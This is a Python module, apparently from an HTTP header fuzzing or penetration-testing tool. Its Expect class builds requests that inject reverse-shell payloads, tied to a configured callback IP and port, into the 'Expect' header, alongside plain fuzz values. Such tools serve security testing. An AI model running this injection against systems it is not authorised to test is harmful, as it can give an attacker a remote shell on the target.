from headers.static_values import *
from worker import *
from utils import *
import requests

class Expect():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = payload,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Expect" : payload
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def expect_fuzz_tests(self):
        expect_fuzz = [
            "100-continue",
            "200-continue",
            "500-continue",
            "999-continue",
            "ABC-continue",
            "100-ok",
            "200-ok",
            "500-ok",
            "999-ok",
            "ABC-ok"
        ]

        for expect in expect_fuzz:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = expect,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Expect" : expect
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()
            self.expect_fuzz_tests()

    def get_tests(self):
        self.generate_tests()
        return self.test_array